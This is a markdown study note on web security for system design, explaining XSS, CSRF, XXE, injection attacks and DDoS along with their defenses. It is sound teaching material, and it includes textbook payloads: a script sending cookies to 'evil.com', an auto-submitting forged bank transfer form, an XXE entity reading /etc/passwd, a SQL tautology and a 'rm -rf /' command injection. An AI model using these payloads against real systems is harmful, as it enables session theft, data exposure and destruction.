# Web Security concepts for system design

## Table of Contents

- [Web Security concepts for system design](#web-security-concepts-for-system-design)
  - [XSS or Cross-Site Scripting](#xss-or-cross-site-scripting)
  - [CSRF or Cross-Site Request Forgery](#csrf-or-cross-site-request-forgery)
  - [XXE or XML External Entity](#xxe-or-xml-external-entity)
  - [Injecting SQL or Code or Command](#injecting-sql-or-code-or-command)
    - [SQL Injection](#sql-injection)
    - [Command Injection](#command-injection)
    - [Code Injection](#code-injection)
    - [Solution or Defense mechanisms](#solution-or-defense-mechanisms)
  - [DoS & DDoS (Denial of Service)](#dos-ddos-denial-of-service)

## XSS or Cross-Site Scripting

**Concept**: The attacker injects malicious client-side scripts (usually JavaScript) into web pages viewed by other users. The browser *trusts the script because it thinks it came from the website*

**Example**: A comment section where a user posts `<script>sendCookiesToAttacker()</script>`. When others view the comment, their browser executes the script
- The Scenario: A blog allows users to post comments. The developer blindly trusts the input.
- The Injection: The attacker posts a comment, but instead of "Great post!", they write: `<script>fetch('http://evil.com?cookie=' + document.cookie)</script>`
- The Storage: The server receives this string and saves it into the comments table in the database exactly as it is
- The Execution: When you (the victim) visit the blog post later, the server fetches all comments from the database and pastes them into the HTML. Your browser sees the `<script>` tag and executes it

```
 [Attacker] --(1) Posts malicious script--> [Server/DB]
                                               |
 [Victim]   <--(2) Loads page with script------|
    |
    +--(3) Script executes, sends Session Cookie --> [Attacker]
```
A more detailed diagram:
```
 [Attacker]
    |
    | (1) POST Comment: "<script>...</script>"
    v
 [Web Server] ----> (2) Saves strict text to DB: "<script>...</script>"
    |                                                |
    |                                            [Database]
    |                                                |
    | <--------------- (3) Server fetches text ------+
    |
    | (4) Server builds HTML: "<div>" + "<script>..." + "</div>"
    v
 [Victim's Browser]
    |
    +---> (5) Parses HTML, sees <script>, EXECUTES it.
```
Code examples:
```html
<!-- React automatically escapes this (Safe) -->
<div>{userInput}</div> 

<!-- client side vulnerability example -->
<!-- Developer forces the embedding (Vulnerable) -->
<!-- This is the specific function where XSS vulnerabilities live in React apps -->
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```
```js
// server side vulnerability example
app.get('/search', (req, res) => {
  // Directly embedding user input into HTML
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
});
```

**Solution or Defense Mechanisms**
1. ***Context-Aware Encoding*** (***Input sanitisation***): Escaping special characters like `<` to `&lt;` at the application layer (most modern frameworks like *React* do this by default)
2. And, ***Content Security Policy*** (***CSP***): Adding a ***Header*** at the Load Balancer or Web Server level to ***restrict where scripts can load from***

## CSRF or Cross-Site Request Forgery

**Concept**: The "Confused Deputy" attack. The attacker tricks a victim's browser into sending a request to a vulnerable server where the victim is currently authenticated. The server processes it because the browser automatically sends the session cookies

**Example**: You are logged into your bank. You visit `evil.com`. It has a hidden form that `POST`s to `bank.com/transfer?to=attacker`. Your browser sends your bank cookies with the request

```
 [Victim Browser]  <--(1) Visits Evil.com------- [Attacker Site]
       |
       | (2) Auto-sends POST request (with Cookies)
       v
 [Bank Server]    ---(3) Processes 'valid' transfer --> $$ Lost
```

**The Core Mechanic: Browsers are Blind to "Context"**: The attack works because *browsers automatically attach cookies based on the destination address, not the source of the request*

**Example**
- You: Log into `bank.com`. Your browser saves a `cookie: session=123`
- Attacker: Tricks you into visiting `evil.com`
- The Attack: `evil.com` contains a hidden script that forces your browser to make a request to `bank.com`
- The Browser's Mistake: Your browser sees a request destined for `bank.com`. It dutifully attaches your `session=123` cookie and sends it
- Result: The bank sees a valid cookie and processes the transaction

Code on attacker's site:
```html
<form action="https://bank.com/transfer" method="POST" id="hack">
    <input type="hidden" name="to" value="Attacker">
</form>
<script>
    // Browser auto-submits this to bank.com immediately
    document.getElementById("hack").submit(); 
</script>
```
Flow:
```
 [ YOU ] (Logged into Bank)
   |
   | 1. Visit evil.com
   v
 [ Browser ] <--- 2. Loads Malicious Script -- [ evil.com ]
   |
   | 3. Script forces POST to bank.com
   | 4. Browser attaches cookie AUTOMATICALLY
   v
 [ bank.com ] (Receives valid cookie, processes money transfer)
```

**Solution or Defense Mechanism**
1. ***Anti-CSRF Tokens*** (***Synchronizer Token Pattern***): Ensure all state-changing operations `(POST/PUT/DELETE`) require a *unique, unpredictable CSRF Token* generated by the server
2. Or, ***SameSite Cookie Attribute***: Set the **`SameSite=Strict`** attribute *on session cookies* to prevent the browser from sending them with cross-site requests

Anti-CSRF Tokens example:
To perform an action, the server requires two keys:
- The Cookie (Automatic): Your browser provides this automatically
- The Token (Manual): *A secret code hidden inside the legitimate webpage*

Why it works: The attacker can force your browser to send Key #1 (Cookie), *but they cannot read Key #2 (Token) from the legitimate website because browser security rules (`Same-Origin Policy`) prevent `evil.com` from reading data on `bank.com`*

```
     [ Legitimate Site ]                 [ Attacker Site ]
              |                                   |
   (Has Secret Token "123")             (Cannot see "123")
              |                                   |
              v                                   v
      [ Browser Request ]                 [ Browser Request ]
     +-------------------+               +-------------------+
     | Cookie: SENT (Auto)|              | Cookie: SENT (Auto)|
     | Token:  "123"      |              | Token:  MISSING!   |
     +-------------------+               +-------------------+
              |                                   |
              v                                   v
      [ Server: ACCEPT ]                  [ Server: REJECT ]
```

SameSite attribute example:
```js
// Setting SameSite attribute
res.cookie('session_id', '12345', {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict' // Cookie not sent on cross-site requests
});
```

**Note**: Here are the ***two standard ways the client "holds" the token*** such that it *cannot be automatically sent like a cookie!*
1. **Traditional App i.e Multi-page website (The "Hidden Field" Method)**:
When the page HTML generated and sent to the client to load, the token is embedded inside a hidden input field within the form tag
	- *Server sends*: `<input type="hidden" value="xyz123">`
	- *Client saves*: It sits in the browser's rendered page content
	- *Client sends*: When you click "Submit", the browser *automatically bundles* the input value into the `POST` body. However, an attacker making a request from their site has no access to this HTML nor hidden input i.e token

2. **Single Page App / SPA (The "Meta Tag" Method)**:
Where is it saved? In the HTML Head or JavaScript Memory. Since *SPAs (like React) make API calls via JavaScript (AJAX/Fetch) instead of standard form submissions*, they need to *grab the token explicitly*
	- *Server sends*: The initial HTML load includes a `meta` tag in the header
	(`<head><meta name="csrf-token" content="xyz123"></head>`)
	- *Client saves*: Your JavaScript (e.g., Axios setup) reads this tag when the app loads (`token = document.querySelector('meta[name="csrf-token"]').content`)
	- *Client sends*: The JS attaches this token to the HTTP Headers of every request it makes (`headers: { 'X-CSRF-TOKEN': token }`)

```
      Traditional App (Form)            Single Page App (React/Vue)
      +----------------------+          +-------------------------+
      |  <html>              |          |  <head>                 |
      |   <form>             |          |   <meta name="csrf"     |
      |    [ Hidden Input ]  |          |         content="XYZ">  |
      |      Value="XYZ"     |          |  </head>                |
      |    [ Submit Btn ]    |          |                         |
      |   </form>            |          |  JS Memory:             |
      |  </html>             |          |  const token = "XYZ"    |
      +----------------------+          +-------------------------+
                 |                                   |
        (Browser sends in Body)             (JS sends in Header)
```

## XXE or XML External Entity

**Concept**: An attack against an ***application that parses XML input***. The attacker uses XML "entities" (**variables**) to trick the parser into *loading local files from the server* or *making network requests (SSRF)*

**Example**: An attacker uploads an XML file that references `/etc/passwd`

```
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

```
 [Attacker] --(1) Sends XML with External Entity--> [App Server]
                                                        |
                                      (2) Parser reads /etc/passwd
                                                        |
 [Attacker] <--(3) Response contains file content-------+
```

**Solution or Defense Mechanism**: *Disable* External Entity Resolution (**DTD**) in the XML parser configuration
-  Ideally, we should use JSON instead of XML for APIs. If XML is required (e.g., legacy SOAP integration), we should explicitly configure the XML parser to disable DTDs (Document Type Definitions) and external entity processing

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Completely disable DTDs
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

## Injecting SQL or Code or Command

```
 [User Input]  +  [Code Template]
      |               |
      v               v
   [Interpreter (SQL DB / OS Shell)]
      |
      +---> Executes Malicious Command (Ex: "Delete All")
```

### SQL Injection

SQL Injection occurs when a ***malicious user inputs data that alters the structure of the database query***. Because the ***database cannot distinguish between the intended code and the user's input***, it executes the injected commands, allowing attackers to access or delete data without permission

**Example**: Imagine a login query: `SELECT * FROM users WHERE name = '$user'`. If the attacker enters `' OR '1'='1` as the username, the resulting query becomes: `SELECT * FROM users WHERE name = '' OR '1'='1'`. Since `1=1` is *always true*, the database returns all users, logging the attacker in as the first user (*usually the Admin*)

```
 [ Attacker Input ]      [ Vulnerable Query Logic ]
      |                          |
      v                          v
" ' OR '1'='1 "      "SELECT * FROM users WHERE name = [INPUT]"
      |                          |
      +-----------+--------------+
                  |
                  v
       [ Resulting Query to DB ]
"SELECT * FROM users WHERE name = '' OR '1'='1'"
                  |
                  v
       [ Database ] -> "TRUE! Here is the Admin data."
```

### Command Injection

The attacker injects commands that are executed by the  **host operating system's shell** (e.g., Bash, PowerShell), effectively giving them *terminal access* to the server

**Example**: App takes a filename to ping ("Ping Tester" tool)
- Input: `google.com; rm -rf /`
- Code: `exec("ping " + input)`
- Result: `exec("ping google.com; rm -rf /`). It will try to delete all files on that server

### Code Injection

The attacker injects code that is *executed by* the **application's programming language runtime** (e.g., Python, Node.js, PHP), allowing them to *manipulate the application's internal logic*

**Example**: Passing `process.exit()` into a form field that gets processed by JavaScript's `eval()` function, causing the server process to crash

**Example**: App uses `eval()` on (a malicious) user input that is set to `require('fs').unlinkSync('server.js')`

```
       Code Injection                    Command Injection
-----------------------------      -----------------------------
[ User Input ] -> [ NodeJS ]       [ User Input ] -> [ NodeJS ]
                      |                                  |
            Executes inside App               Passes to OS Shell
             (Changes vars)                    (Runs Terminal)
```

### Solution or Defense mechanisms

1. ***Separation of Data and Code*** ("Prepared Statements"/"Parameterization"): 
	- For SQL, mandate the use of *ORMs* or *Prepared Statements* for all DB access
	- For Command execution, avoid shell calls entirely, preferring native language libraries
2.  And, ***Input Validation***: Validate Sanitize any input from the client first by checking its characters, format, regex, escape certain characters, etc (***Solution for XSS as well***!)

*SQL parameterization* is a technique that uses placeholders for user input in a database query, ensuring the database treats that input strictly as data rather than executable code to prevent SQL injection attacks
```js
// BAD
db.query(`SELECT * FROM users WHERE id = ${req.query.id}`);

// GOOD (Prepared Statement)
// The database compiles the SQL first, then inserts data safely.
db.query('SELECT * FROM users WHERE id = ?', [req.query.id]);
```

## DoS & DDoS (Denial of Service)

**Concept**:
- **DoS**: One attacker floods a server to exhaust resources (CPU, RAM, Bandwidth)
- **DDoS (Distributed)**: The attacker uses a "Botnet" (thousands of infected devices) to flood the target from many IP addresses simultaneously

**Example**:
- **L4 Attack (SYN Flood)**: Sending thousands of "Hello?" TCP packets but never completing the handshake
- **L7 Attack (HTTP Flood)**: Hitting a heavy endpoint (e.g., POST /generate-report) 10,000 times a second

```
 [Bot 1] --\
 [Bot 2] ----\  (Massive Traffic)
 ...          >---> [Load Balancer / Server] ---> (Crashes/Unresponsive)
 [Bot N] ----/
```

**Solution or Defense Mechanism**: ***Rate Limiting*** (on API Gateway), ***CDNs*** (handle issue at Edge Servers), and ***Traffic Analysis*** (Within the app). Mitigating DDoS requires a multi-layered approach:
1. **Edge/CDN**: Use Cloudflare or AWS Shield to *absorb massive L3/L4 traffic (volumetric attacks) before it hits our infra*
2. ***Load Balancer***: Implement *Rate Limiting* (e.g., Token Bucket algorithm) based on IP or User ID to drop excessive requests
3. ***App Layer***: Implement *timeouts* and *Circuit Breakers* to fail fast if backend services are overwhelmed

